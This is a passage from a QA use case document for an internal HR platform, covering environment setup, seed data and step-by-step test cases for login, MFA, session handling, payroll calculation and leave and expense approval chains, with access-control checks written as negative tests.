# NU-AURA — Master QA Use Case Document

| Field                 | Value                                                                                |
|-----------------------|--------------------------------------------------------------------------------------|
| **Version**           | 1.0.0                                                                                |
| **Date**              | 2026-04-02                                                                           |
| **Author**            | QA Engineering — NU-AURA Platform                                                    |
| **Status**            | Active                                                                               |
| **Total Use Cases**   | 318                                                                                  |
| **Scope**             | NU-HRMS (P1), NU-Hire (P2), NU-Grow (P3) — NU-Fluence excluded (frontend incomplete) |
| **Base Frontend URL** | http://localhost:3000                                                                |
| **Base Backend URL**  | http://localhost:8080/api/v1                                                         |
| **E2E Test Runner**   | Playwright (`frontend/e2e/`)                                                         |
| **Spec Count**        | 97 spec files                                                                        |

---

## Overview

This document is the authoritative QA use case reference for the NU-AURA internal HR platform. It
covers all three active sub-applications and the shared platform layer:

| Sub-App      | Priority      | Scope                                                                                                                                                          |
|--------------|---------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **NU-HRMS**  | P1 — Highest  | Employee lifecycle, attendance, leave, payroll, benefits, assets, expenses, loans, travel, contracts, letters, helpdesk, timesheets, resources, reports, admin |
| **NU-Hire**  | P2 — High     | Recruitment, interviews, offers, preboarding, onboarding, offboarding, referrals                                                                               |
| **NU-Grow**  | P3 — Medium   | Performance reviews, OKRs, 360 feedback, LMS/training, recognition, surveys, wellness                                                                          |
| **Platform** | P0 — Critical | Auth, approval engine, payroll engine, RBAC, multi-tenancy, session security                                                                                   |

**Priority Definitions:**

- **P0** — System-breaking. Failures block all releases. Run first on every deploy.
- **P1** — Business-critical. Core HRMS functionality. Failures block HRMS launch.
- **P2** — Important. NU-Hire flows. Must pass before recruiter rollout.
- **P3** — Standard quality bar. NU-Grow flows. Must pass before performance cycle launch.

---

## How to Use This Document

1. **QA Agents**: Execute each use case sequentially within its module group. Always run P0 cases
   before P1/P2/P3.
2. **Each use case** has a positive path (happy path) and a negative path (RBAC, validation, error
   boundary).
3. **Playwright specs**: Where an E2E spec file exists, it is referenced. Run it with
   `npx playwright test frontend/e2e/<spec>.ts`.
4. **API verification**: After UI actions, confirm backend state via the listed API endpoint or
   direct DB query.
5. **All test users** share the password `Welcome@123` unless specified otherwise.
6. **Seed data** must be in place before executing any use case — see the Seed Data section.

---

## Test Environment Setup

### Prerequisites

```bash
# 1. Start infrastructure services
docker-compose up -d  # Redis, Kafka, Elasticsearch, Prometheus

# 2. Start backend
cd backend && ./start-backend.sh   # Spring Boot on :8080

# 3. Start frontend
cd frontend && npm run dev          # Next.js on :3000

# 4. Verify health
curl http://localhost:8080/actuator/health  # should return {"status":"UP"}
curl http://localhost:3000                  # should return 200
```

### Browser Setup

- **Browser:** Google Chrome (latest stable)
- **Window size:** 1440x900 minimum (desktop-first application)
- **Cookies:** httpOnly cookies enabled (JWT stored as `nu_aura_token`)
- **Playwright config:** `frontend/playwright.config.ts`
- **Auth storage state:** `frontend/e2e/auth.setup.ts`

### Running Playwright Tests

```bash
# Run all tests
cd frontend && npx playwright test

# Run a specific spec
npx playwright test e2e/auth.spec.ts

# Run with UI
npx playwright test --ui

# Run tagged tests (e.g., critical path)
npx playwright test --grep "@critical"

# Run in headed mode (visible browser)
npx playwright test --headed
```

---

## Seed Data Requirements

Before executing any use case, the following seed data must be present in the database (applied via
Flyway migrations on the demo profile):

### Tenant

| Field     | Value            |
|-----------|------------------|
| Name      | NULogic Internal |
| Subdomain | nulogic          |
| Status    | ACTIVE           |
| Timezone  | Asia/Kolkata     |

### User Accounts (all passwords: `Welcome@123`)

| Email                          | Role              | Name                | Department  |
|--------------------------------|-------------------|---------------------|-------------|
| fayaz.m@nulogic.io             | SUPER_ADMIN       | Fayaz M             | Executive   |
| sarankarthick.maran@nulogic.io | SUPER_ADMIN       | Sarankarthick Maran | Executive   |
| jagadeesh@nulogic.io           | HR_MANAGER        | Jagadeesh N         | HR          |
| sumit@nulogic.io               | MANAGER           | Sumit Kumar         | Engineering |
| mani@nulogic.io                | TEAM_LEAD         | Mani S              | Engineering |
| saran@nulogic.io               | EMPLOYEE          | Saran V             | Engineering |
| raj@nulogic.io                 | EMPLOYEE          | Raj V               | Engineering |
| arun@nulogic.io                | EMPLOYEE          | Arun K              | HR          |
| suresh@nulogic.io              | RECRUITMENT_ADMIN | Suresh M            | HR          |
| newjoiner@nulogic.io           | NEW_JOINER        | New Joiner          | Engineering |

### Departments

| Code  | Name            | Head         |
|-------|-----------------|--------------|
| ENG   | Engineering     | Sumit Kumar  |
| HR    | Human Resources | Jagadeesh N  |
| SALES | Sales           | (unassigned) |

### Office Locations

| Code | Name          | City      | State       |
|------|---------------|-----------|-------------|
| BLR  | Bangalore HQ  | Bangalore | Karnataka   |
| MUM  | Mumbai Branch | Mumbai    | Maharashtra |

### Salary Structure (Standard)

| Component         | Type      | Formula / Value                                       |
|-------------------|-----------|-------------------------------------------------------|
| Basic             | EARNING   | `ctc * 0.40`                                          |
| HRA               | EARNING   | `basic * 0.20`                                        |
| DA                | EARNING   | `basic * 0.10`                                        |
| Special Allowance | EARNING   | `ctc - basic - hra - da - pf_employer - esi_employer` |
| PF Employee       | DEDUCTION | `basic * 0.12` (capped at ₹1,800/month)               |
| ESI Employee      | DEDUCTION | `gross_salary * 0.0075` (if gross <= 21000)           |
| Professional Tax  | DEDUCTION | State-rule-based slab                                 |
| Income Tax (TDS)  | DEDUCTION | Monthly projected TDS                                 |
| Net Pay           | COMPUTED  | `sum(earnings) - sum(deductions)`                     |

### Payroll State

- 1 payroll run for previous month in **PROCESSED** status
- Payslips generated for all 10 seed employees
- Net pay verified: CTC 600000 → Basic 20000/month, HRA 4000, DA 2000, Net ~17500 after deductions

### Leave Configuration

| Type         | Code | Days/Year | Carry-Forward | Encashable |
|--------------|------|-----------|---------------|------------|
| Annual Leave | AL   | 15        | Yes (max 5)   | Yes        |
| Sick Leave   | SL   | 10        | No            | No         |
| Casual Leave | CL   | 5         | No            | No         |

### Employee Leave Balances (as of test date)

| Employee         | AL Balance | SL Balance | CL Balance |
|------------------|------------|------------|------------|
| saran@nulogic.io | 12         | 7          | 3          |
| raj@nulogic.io   | 10         | 10         | 5          |
| arun@nulogic.io  | 8          | 5          | 2          |
| mani@nulogic.io  | 14         | 9          | 4          |
| sumit@nulogic.io | 11         | 8          | 5          |

### Recruitment / NU-Hire

- 2 active job openings: "Senior Backend Engineer" (Engineering), "HR Executive" (HR)
- 1 candidate in pipeline: "Test Candidate" — stage: SCREENING for Senior Backend Engineer
- 1 offer letter template: Standard Offer Letter

### Performance / NU-Grow

- 1 active performance review cycle: "Q1 2026 Review" — status: IN_PROGRESS
- 3 LMS courses: "Onboarding 101" (mandatory), "Java Spring Boot Advanced", "Soft Skills
  Masterclass"
- 1 active OKR: Company OKR Q1 2026

---

## P0 — Critical Platform Tests

---

### UC-AUTH-001 — Email/Password Login (Happy Path)

- **Priority:** P0
- **Sub-App:** Platform (shared)
- **Persona:** Any role
- **URL:** http://localhost:3000/auth/login
- **API Endpoint:** `POST /api/v1/auth/login`
- **Playwright Spec:** `frontend/e2e/auth.spec.ts`, `frontend/e2e/auth-flow.spec.ts`
- **Preconditions:** Backend running, seed user `saran@nulogic.io` exists with status ACTIVE
- **Test Steps:**
  1. Navigate to http://localhost:3000/auth/login
  2. Verify page renders: email field, password field, "Sign In" button, Google OAuth button visible
  3. Enter email: `saran@nulogic.io`
  4. Enter password: `Welcome@123`
  5. Click "Sign In" button
  6. Wait for redirect to `/dashboard`
  7. Verify user name "Saran V" appears in header/top bar
  8. Verify sidebar shows EMPLOYEE-level navigation items
- **Expected Result:** HTTP 200 from `/api/v1/auth/login` with
  `{ "token": "...", "user": { "role": "EMPLOYEE" } }`. JWT cookie `nu_aura_token` set as httpOnly.
  User lands on `/dashboard`.
- **Negative Test:** Enter incorrect password `wrongpassword` → Expect HTTP 401, error toast "
  Invalid credentials" displayed, user remains on `/auth/login`. After 5 failed attempts, account
  locked for 15 minutes → HTTP 423 with message "Account locked".
- **Verification:** `GET /api/v1/auth/me` returns
  `{ "email": "saran@nulogic.io", "role": "EMPLOYEE" }` with status 200.

---

### UC-AUTH-002 — Google OAuth SSO Login

- **Priority:** P0
- **Sub-App:** Platform (shared)
- **Persona:** Any role with Google Workspace account
- **URL:** http://localhost:3000/auth/login
- **API Endpoint:** `POST /api/v1/auth/google`
- **Playwright Spec:** `frontend/e2e/auth.spec.ts`
- **Preconditions:** Google OAuth client configured in backend (`GOOGLE_CLIENT_ID` env var set).
  Test Google account mapped to a seed user.
- **Test Steps:**
  1. Navigate to http://localhost:3000/auth/login
  2. Click "Sign in with Google" button
  3. Google OAuth popup/redirect opens
  4. Authenticate with Google account (`fayaz.m@nulogic.io` Google workspace account)
  5. Google redirects back with authorization code
  6. Backend exchanges code for ID token and issues JWT
  7. User redirected to `/dashboard`
- **Expected Result:** POST to `/api/v1/auth/google` with `{ "idToken": "<google_id_token>" }`
  returns HTTP 200 with JWT cookie set. User lands on dashboard as SUPER_ADMIN.
- **Negative Test:** Submit a tampered/invalid Google ID token → HTTP 400 with
  `{ "error": "Invalid Google token" }`. No JWT cookie set.
- **Verification:** `GET /api/v1/auth/me` confirms authenticated user. Browser DevTools →
  Application → Cookies: `nu_aura_token` present with `HttpOnly: true`, `Secure: true` (in
  production).

---

### UC-AUTH-003 — MFA (TOTP) Setup and Login

- **Priority:** P0
- **Sub-App:** Platform (shared)
- **Persona:** HR_ADMIN, SUPER_ADMIN
- **URL:** http://localhost:3000/security
- **API Endpoint:** `GET /api/v1/auth/mfa/setup`, `POST /api/v1/auth/mfa/verify`,
  `POST /api/v1/auth/mfa-login`
- **Playwright Spec:** `frontend/e2e/auth.spec.ts`
- **Preconditions:** User logged in as `jagadeesh@nulogic.io` (HR_MANAGER). MFA not yet enabled.
- **Test Steps:**
  1. Navigate to http://localhost:3000/security
  2. Click "Enable MFA" / "Set up Two-Factor Authentication"
  3. `GET /api/v1/auth/mfa/setup` returns QR code and secret
  4. Verify QR code displayed on screen
  5. Scan QR code with authenticator app (Google Authenticator / Authy)
  6. Enter the 6-digit TOTP code
  7. Click "Verify and Enable"
  8. `POST /api/v1/auth/mfa/verify` called with `{ "code": "<6-digit>" }`
  9. Success message: "MFA enabled successfully"
  10. Log out
  11. Log back in with email/password — MFA challenge screen appears
  12. Enter current TOTP code
  13. `POST /api/v1/auth/mfa-login` called
  14. Full dashboard access granted
- **Expected Result:** MFA status set to ENABLED in DB. Login now requires 2 steps.
  `GET /api/v1/auth/mfa/status` returns `{ "enabled": true }`.
- **Negative Test:** Enter expired/wrong TOTP code (e.g., `000000`) → HTTP 401 with
  `{ "error": "Invalid MFA code" }`. Remaining attempts counter decremented. After 3 wrong TOTP
  attempts, account requires password re-entry.
- **Verification:** DB query `SELECT mfa_enabled FROM users WHERE email = 'jagadeesh@nulogic.io'`
  returns `true`.

---

### UC-AUTH-004 — Logout and Session Invalidation

- **Priority:** P0
- **Sub-App:** Platform (shared)
- **Persona:** Any role
- **URL:** http://localhost:3000 (any authenticated page)
- **API Endpoint:** `POST /api/v1/auth/logout`
- **Playwright Spec:** `frontend/e2e/auth.spec.ts`
- **Preconditions:** User logged in as `saran@nulogic.io`.
- **Test Steps:**
  1. Verify user is authenticated (at `/dashboard`)
  2. Click user avatar/profile menu in header
  3. Click "Logout"
  4. `POST /api/v1/auth/logout` fires
  5. JWT token added to Redis blacklist (`TokenBlacklistService`)
  6. Cookies cleared
  7. Redirected to `/auth/login`
  8. Attempt to navigate to `/dashboard` directly (via URL bar)
  9. Verify redirect back to `/auth/login`
  10. Attempt `GET /api/v1/auth/me` with the old JWT token (copy from cookie before logout)
- **Expected Result:** HTTP 200 from logout endpoint. Cookie cleared. All subsequent authenticated
  requests return HTTP 401. Old JWT rejected even if not expired.
- **Negative Test:** Manually set an old (blacklisted) JWT cookie and attempt
  `GET /api/v1/employees` → HTTP 401 `{ "error": "Token has been invalidated" }`.
- **Verification:** Redis key `token:blacklist:<jwt_jti>` exists with positive TTL.

---

### UC-AUTH-005 — JWT Refresh Token Flow

- **Priority:** P0
- **Sub-App:** Platform (shared)
- **Persona:** Any role
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** `POST /api/v1/auth/refresh`
- **Playwright Spec:** `frontend/e2e/auth.spec.ts`
- **Preconditions:** User logged in. Access token TTL is short (15 minutes in dev config).
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Wait until access token is near expiry (or manually set short expiry in test config)
  3. Make an authenticated API request (e.g., navigate to `/employees`)
  4. Frontend Axios interceptor detects 401 with `{ "error": "Token expired" }`
  5. Interceptor automatically calls `POST /api/v1/auth/refresh` with refresh token cookie
  6. New access token cookie set
  7. Original request retried transparently
  8. User sees no error — page loads normally
- **Expected Result:** Seamless token refresh. User remains on page. Network panel shows: first
  `401` on original request, then `200` on `/auth/refresh`, then `200` on retried original request.
- **Negative Test:** Refresh token expired or blacklisted → `POST /api/v1/auth/refresh` returns HTTP
  401 → User redirected to `/auth/login` with message "Session expired. Please log in again."
- **Verification:** New JWT cookie has updated `exp` claim. Old token blacklisted in Redis.

---

### UC-AUTH-006 — Password Reset Flow

- **Priority:** P0
- **Sub-App:** Platform (shared)
- **Persona:** Any role
- **URL:** http://localhost:3000/auth/login → "Forgot Password"
- **API Endpoint:** `POST /api/v1/auth/forgot-password`, `POST /api/v1/auth/reset-password`
- **Playwright Spec:** `frontend/e2e/auth.spec.ts`
- **Preconditions:** Backend email service configured (or mock email service running).
  `saran@nulogic.io` exists.
- **Test Steps:**
  1. Navigate to http://localhost:3000/auth/login
  2. Click "Forgot Password?" link
  3. Enter `saran@nulogic.io` in email field
  4. Click "Send Reset Link"
  5. `POST /api/v1/auth/forgot-password` called with `{ "email": "saran@nulogic.io" }`
  6. Toast: "If this email exists, a reset link has been sent"
  7. Check email (or mock email service) for reset link containing token
  8. Open reset link: http://localhost:3000/reset-password?token=<reset_token>
  9. Enter new password: `NewSecure@456`
  10. Confirm password: `NewSecure@456`
  11. Click "Reset Password"
  12. `POST /api/v1/auth/reset-password` called with
      `{ "token": "<reset_token>", "password": "NewSecure@456" }`
  13. Redirect to `/auth/login` with success message
  14. Log in with new password
- **Expected Result:** HTTP 200 from reset endpoint. Old password no longer valid. Password history
  check: cannot reuse last 5 passwords.
- **Negative Test:** Use expired reset token (> 24hr old) → HTTP 400
  `{ "error": "Reset token expired or invalid" }`. Use weak password `password123` → HTTP 400
  validation error listing policy violations (requires uppercase, special char, min 12 chars).
- **Verification:** `POST /api/v1/auth/login` with old password returns 401. New password login
  returns 200.

---

### UC-AUTH-007 — Rate Limiting on Auth Endpoints

- **Priority:** P0
- **Sub-App:** Platform (shared)
- **Persona:** Unauthenticated attacker simulation
- **URL:** http://localhost:3000/auth/login
- **API Endpoint:** `POST /api/v1/auth/login`
- **Playwright Spec:** `frontend/e2e/auth.spec.ts`
- **Preconditions:** Redis running, `DistributedRateLimiter` active (5 requests/minute for auth).
- **Test Steps:**
  1. Make 5 rapid POST requests to `/api/v1/auth/login` with invalid credentials
  2. 6th request within the same minute window
- **Expected Result:** First 5 requests return HTTP 401 (invalid credentials). 6th request returns
  HTTP 429 `{ "error": "Too many login attempts. Try again in X seconds." }` with `Retry-After`
  header.
- **Negative Test:** Wait 60 seconds → Rate limit window resets → 6th attempt accepted (still 401
  for wrong password but not 429).
- **Verification:** Redis key `rate:auth:<ip>` with TTL showing remaining window.

---

### UC-PAY-001 — Create Salary Structure

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, HR_MANAGER
- **URL:** http://localhost:3000/payroll/salary-structures
- **API Endpoint:** `POST /api/v1/payroll/salary-structures`
- **Playwright Spec:** `frontend/e2e/payroll-end-to-end.spec.ts`,
  `frontend/e2e/payroll-flow.spec.ts`
- **Preconditions:** Logged in as `jagadeesh@nulogic.io` (HR_MANAGER). No existing structure with
  name "Standard Engineer Band".
- **Test Steps:**
  1. Navigate to http://localhost:3000/payroll/salary-structures
  2. Click "Create Salary Structure"
  3. Enter name: "Standard Engineer Band"
  4. Select effective date: 2026-04-01
  5. Add component: Basic — type EARNING — formula `ctc * 0.40`
  6. Add component: HRA — type EARNING — formula `basic * 0.20`
  7. Add component: DA — type EARNING — formula `basic * 0.10`
  8. Add component: Special Allowance — type EARNING — formula
     `ctc - basic - hra - da - pf_employer - esi_employer`
  9. Add component: PF Employee — type DEDUCTION — formula `MIN(basic * 0.12, 1800)`
  10. Add component: ESI Employee — type DEDUCTION — formula `IF(gross <= 21000, gross * 0.0075, 0)`
  11. Add component: Professional Tax — type DEDUCTION — rule: state-slab
  12. Click "Save Structure"
  13. Verify structure appears in list with status ACTIVE
- **Expected Result:** HTTP 201 from POST with
  `{ "id": <uuid>, "name": "Standard Engineer Band", "components": [...], "status": "ACTIVE" }`.
  Structure appears in list view.
- **Negative Test:** Log in as `saran@nulogic.io` (EMPLOYEE) and attempt POST to
  `/api/v1/payroll/salary-structures` → HTTP 403
  `{ "error": "Access denied: payroll.write required" }`. The /payroll/salary-structures route
  should redirect to `/403` or show an access denied page.
- **Verification:** `GET /api/v1/payroll/salary-structures` returns the new structure in the list.

---

### UC-PAY-002 — Run Payroll for a Month

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, HR_MANAGER
- **URL:** http://localhost:3000/payroll/runs
- **API Endpoint:** `POST /api/v1/payroll/runs`, `POST /api/v1/payroll/runs/{id}/process`
- **Playwright Spec:** `frontend/e2e/payroll-run.spec.ts`, `frontend/e2e/payroll-end-to-end.spec.ts`
- **Preconditions:** Logged in as `jagadeesh@nulogic.io`. Salary structures assigned to all
  employees. Attendance data for period is finalized.
- **Test Steps:**
  1. Navigate to http://localhost:3000/payroll/runs
  2. Click "New Payroll Run"
  3. Select period: March 2026 (2026-03-01 to 2026-03-31)
  4. Select salary structure: "Standard Engineer Band"
  5. Click "Create Run" — POST `/api/v1/payroll/runs` with
     `{ "periodStart": "2026-03-01", "periodEnd": "2026-03-31", "salaryStructureId": "<uuid>" }`
  6. Run created with status DRAFT
  7. Click "Process Payroll" on the run
  8. POST `/api/v1/payroll/runs/{id}/process`
  9. Wait for processing spinner — status transitions: DRAFT → PROCESSING → PROCESSED
  10. Verify payslip count matches employee count
  11. Click on one payslip to view details
  12. Verify: CTC 600000/year → Basic = 20000, HRA = 4000, DA = 2000, Net ≈ 17500
- **Expected Result:** All payslips generated. SpEL DAG evaluates components in dependency order.
  Net pay formula verified: `sum(earnings) - sum(deductions)`. Status: PROCESSED.
- **Negative Test:** Attempt to create a payroll run for a period that already has a PROCESSED run →
  HTTP 409 `{ "error": "Payroll already processed for this period" }`.
- **Verification:** `GET /api/v1/payroll/runs/{id}/status` returns
  `{ "status": "PROCESSED", "payslipCount": 10 }`. DB: `payroll_runs.status = 'PROCESSED'`.

---

### UC-PAY-003 — Verify SpEL Formula Accuracy

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/runs/{id}
- **API Endpoint:** `GET /api/v1/payroll/payslips/employee/{employeeId}/period`
- **Playwright Spec:** `frontend/e2e/payroll-end-to-end.spec.ts`
- **Preconditions:** Payroll run PROCESSED for March 2026. Employee CTC = ₹600,000/year.
- **Test Steps:**
  1. Navigate to the payroll run for March 2026
  2. Open payslip for `saran@nulogic.io` (CTC 600000)
  3. Verify each component value:

  - Annual CTC: ₹6,00,000 → Monthly CTC: ₹50,000
  - Basic = ₹50,000 × 0.40 = **₹20,000**
  - HRA = ₹20,000 × 0.20 = **₹4,000**
  - DA = ₹20,000 × 0.10 = **₹2,000**
  - PF Employee = MIN(₹20,000 × 0.12, ₹1,800) = **₹1,800**
  - ESI = ₹0 (gross > ₹21,000 exemption threshold)
  - Professional Tax = **₹200** (Karnataka slab for ₹15,000+)
  - Gross Earnings = ₹20,000 + ₹4,000 + ₹2,000 + Special Allowance
  - Net Pay = Gross − PF − ESI − PT − TDS

  4. Export payslip as PDF
  5. Verify PDF contains correct breakdowns
- **Expected Result:** All formula values match expected calculation. PDF generated with correct
  values. No formula evaluation errors.
- **Negative Test:** Manually modify a SpEL formula to introduce a circular dependency (component A
  depends on B, B depends on A) → Backend returns HTTP 400
  `{ "error": "Circular dependency detected in salary components" }`.
- **Verification:** API response:
  `GET /api/v1/payroll/payslips/employee/{id}/period?periodStart=2026-03-01&periodEnd=2026-03-31`
  returns payslip with each earnings/deduction component value.

---

### UC-PAY-004 — Generate and Download Payslip PDF

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (own payslip), HR_ADMIN (any payslip)
- **URL:** http://localhost:3000/me/payslips (employee), http://localhost:3000/payroll/payslips (
  admin)
- **API Endpoint:** `GET /api/v1/payroll/payslips/{id}/pdf`
- **Playwright Spec:** `frontend/e2e/payroll-end-to-end.spec.ts`
- **Preconditions:** Payroll run processed. Payslip exists for `saran@nulogic.io` for March 2026.
- **Test Steps:**
  1. Log in as `saran@nulogic.io` (EMPLOYEE)
  2. Navigate to http://localhost:3000/me/payslips
  3. Click on March 2026 payslip entry
  4. Click "Download PDF"
  5. Verify PDF download starts — `GET /api/v1/payroll/payslips/{id}/pdf`
  6. Open downloaded PDF
  7. Verify PDF contains: employee name, CTC, all earnings, all deductions, net pay, company logo,
     month/year
- **Expected Result:** PDF generated via OpenPDF library. File named `Payslip_Saran_V_2026-03.pdf`.
  Content type `application/pdf`. All values match UI display.
- **Negative Test:** Employee `saran@nulogic.io` attempts to download payslip of `raj@nulogic.io` by
  changing `employeeId` in API URL → HTTP 403
  `{ "error": "You can only access your own payslips" }`.
- **Verification:** HTTP response header `Content-Type: application/pdf`,
  `Content-Disposition: attachment; filename="Payslip_Saran_V_2026-03.pdf"`.

---

### UC-PAY-005 — Lock Payroll Run

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/runs/{id}
- **API Endpoint:** `POST /api/v1/payroll/runs/{id}/lock`
- **Playwright Spec:** `frontend/e2e/payroll-run.spec.ts`
- **Preconditions:** Payroll run in PROCESSED status.
- **Test Steps:**
  1. Navigate to the payroll run details page
  2. Click "Lock Payroll Run"
  3. Confirm dialog: "Are you sure? Locked payrolls cannot be modified."
  4. Click "Confirm Lock"
  5. `POST /api/v1/payroll/runs/{id}/lock`
  6. Run status changes to LOCKED
  7. Verify all edit buttons are disabled/hidden on the run
  8. Attempt to modify any payslip value
- **Expected Result:** Run status becomes LOCKED. No edits possible. Lock timestamp recorded.
- **Negative Test:** Attempt `PUT /api/v1/payroll/runs/{id}` on a LOCKED run → HTTP 409
  `{ "error": "Cannot modify a locked payroll run" }`.
- **Verification:** `GET /api/v1/payroll/runs/{id}` returns
  `{ "status": "LOCKED", "lockedAt": "<timestamp>", "lockedBy": "<userId>" }`.

---

### UC-PAY-006 — Process Payroll Adjustments and Arrears

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/adjustments
- **API Endpoint:** `POST /api/v1/payroll/runs` (with adjustment type)
- **Playwright Spec:** `frontend/e2e/payroll-flow.spec.ts`
- **Preconditions:** Existing PROCESSED payroll run for March 2026. Employee received a late
  increment.
- **Test Steps:**
  1. Navigate to http://localhost:3000/payroll/adjustments
  2. Create new adjustment run
  3. Select employee: `saran@nulogic.io`
  4. Type: ARREAR
  5. Amount: ₹5,000
  6. Effective from: February 2026
  7. Effective to: March 2026
  8. Reason: "Annual increment processed late"
  9. Run adjustment payroll
  10. Verify arrear amount appears in supplementary payslip
  11. Verify arrear is TDS-taxable in the month of payment
- **Expected Result:** Arrear payslip generated with amount ₹5,000. Net arrear calculated after
  applicable TDS. Supplementary payslip available for download.
- **Negative Test:** Attempt to add negative adjustment (negative salary) → HTTP 400
  `{ "error": "Adjustment amount cannot result in negative net pay" }`.
- **Verification:** `GET /api/v1/payroll/payslips/employee/{id}/period` shows an additional payslip
  with `type: ADJUSTMENT`.

---

### UC-APPR-001 — Leave Approval Chain (Employee → Manager → HR)

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (submit), MANAGER (L1 approve), HR_MANAGER (L2 approve)
- **URL:** http://localhost:3000/leave/apply (submit), http://localhost:3000/approvals (approve)
- **API Endpoint:** `POST /api/v1/leave/requests`, `POST /api/v1/approvals/tasks/{taskId}/approve`
- **Playwright Spec:** `frontend/e2e/leave-approval-chain.spec.ts`,
  `frontend/e2e/approvals-workflows.spec.ts`
- **Preconditions:** `saran@nulogic.io` has 12 AL balance. Manager is `sumit@nulogic.io`. HR manager
  is `jagadeesh@nulogic.io`.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/leave/apply
  3. Select leave type: Annual Leave
  4. Select dates: 2026-04-10 to 2026-04-11 (2 days)
  5. Enter reason: "Personal work"
  6. Submit request — `POST /api/v1/leave/requests`
  7. Verify leave request appears in "My Requests" with status PENDING
  8. Log out and log in as `sumit@nulogic.io` (MANAGER)
  9. Navigate to http://localhost:3000/approvals
  10. Find Saran's leave request in pending list
  11. Click "Approve" — `POST /api/v1/approvals/tasks/{l1TaskId}/approve` with
      `{ "comment": "Approved" }`
  12. Status changes to L1_APPROVED (if 2-step chain) or APPROVED (if 1-step)
  13. Log out and log in as `jagadeesh@nulogic.io` (HR_MANAGER)
  14. Navigate to approvals
  15. L2 approval: Click "Approve"
  16. Status changes to APPROVED
  17. Log back in as `saran@nulogic.io`
  18. Verify leave request shows status APPROVED
  19. Verify leave balance updated: AL = 10 (was 12, deducted 2)
- **Expected Result:** Full approval chain completed. Leave balance deducted. Kafka event published
  to `nu-aura.approvals` topic. Email notification sent to employee.
- **Negative Test:** Log in as `raj@nulogic.io` (different employee, same team) and attempt to
  approve Saran's leave task → HTTP 403 `{ "error": "You are not an assignee for this task" }`.
- **Verification:** `GET /api/v1/leave/requests/{id}` returns
  `{ "status": "APPROVED", "approvedBy": "jagadeesh@nulogic.io" }`.
  `GET /api/v1/leave/balances?employeeId=<id>` shows AL reduced by 2.

---

### UC-APPR-002 — Leave Rejection with Comment

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** MANAGER (reject), EMPLOYEE (view rejection)
- **URL:** http://localhost:3000/approvals
- **API Endpoint:** `POST /api/v1/approvals/tasks/{taskId}/reject`
- **Playwright Spec:** `frontend/e2e/approvals-workflows.spec.ts`
- **Preconditions:** Pending leave request exists for `saran@nulogic.io`.
- **Test Steps:**
  1. Log in as `sumit@nulogic.io` (MANAGER)
  2. Open approval task for Saran's leave
  3. Click "Reject"
  4. Enter rejection reason: "Team sprint delivery conflict"
  5. Submit rejection
  6. Log in as `saran@nulogic.io`
  7. Navigate to http://localhost:3000/leave/requests
  8. Verify request shows REJECTED status
  9. Verify rejection reason visible
  10. Verify leave balance unchanged (AL still 12)
- **Expected Result:** HTTP 200, status = REJECTED, rejection comment stored. Balance not deducted.
  Notification sent to employee.
- **Negative Test:** Reject with empty reason (if reason is mandatory) → HTTP 400
  `{ "error": "Rejection reason is required" }`.
- **Verification:** `GET /api/v1/leave/requests/{id}` returns
  `{ "status": "REJECTED", "rejectionReason": "Team sprint delivery conflict" }`.

---

### UC-APPR-003 — Expense Approval Chain

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (submit), MANAGER (approve), HR_ADMIN (reimburse)
- **URL:** http://localhost:3000/expenses/new
- **API Endpoint:** `POST /api/v1/expenses`, `POST /api/v1/approvals/tasks/{taskId}/approve`
- **Playwright Spec:** `frontend/e2e/expense-flow.spec.ts`, `frontend/e2e/expenses.spec.ts`
- **Preconditions:** `saran@nulogic.io` active. Expense policy: travel category max ₹5,000/claim.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/expenses/new
  3. Add line item: Category = Travel, Amount = ₹1,500, Date = 2026-04-01, Description = "Cab to
     client office"
  4. Upload receipt (JPG/PNG)
  5. Submit expense claim
  6. Manager (`sumit@nulogic.io`) approves via approval inbox
  7. HR (`jagadeesh@nulogic.io`) marks as REIMBURSED
- **Expected Result:** Expense claim flows through approval chain. Final status REIMBURSED.
  Reimbursement amount recorded.
- **Negative Test:** Submit expense with amount ₹6,000 exceeding policy limit → Frontend validation
  error OR backend HTTP 400
  `{ "error": "Expense amount exceeds policy limit for category TRAVEL" }`.
- **Verification:** `GET /api/v1/expenses/{id}` returns
  `{ "status": "REIMBURSED", "amount": 1500 }`.

---

### UC-APPR-004 — Overtime Request Approval

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (submit), MANAGER (approve)
- **URL:** http://localhost:3000/overtime
- **API Endpoint:** `POST /api/v1/overtime/requests`
- **Playwright Spec:** `frontend/e2e/overtime.spec.ts`
- **Preconditions:** Overtime policy enabled for Engineering department.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/overtime
  3. Click "Request Overtime"
  4. Enter date: 2026-04-05 (Saturday)
  5. Hours: 4 hours
  6. Reason: "Release deployment support"
  7. Submit — `POST /api/v1/overtime/requests`
  8. Manager approves via approval inbox
  9. Verify overtime hours reflected in attendance/timesheet
  10. Verify OT compensation applied in payroll (if configured)
- **Expected Result:** Overtime request approved. Hours logged. Compensatory off or OT pay applied
  per policy.
- **Negative Test:** Submit overtime for a future date > 7 days ahead → HTTP 400
  `{ "error": "Overtime can only be requested within 7 days" }` (if policy enforces).
- **Verification:** `GET /api/v1/overtime/requests?employeeId=<id>` returns approved request.

---

### UC-APPR-005 — Approval Escalation on Timeout

- **Priority:** P0
- **Sub-App:** Platform (shared)
- **Persona:** System (scheduled job), HR_ADMIN (receives escalation)
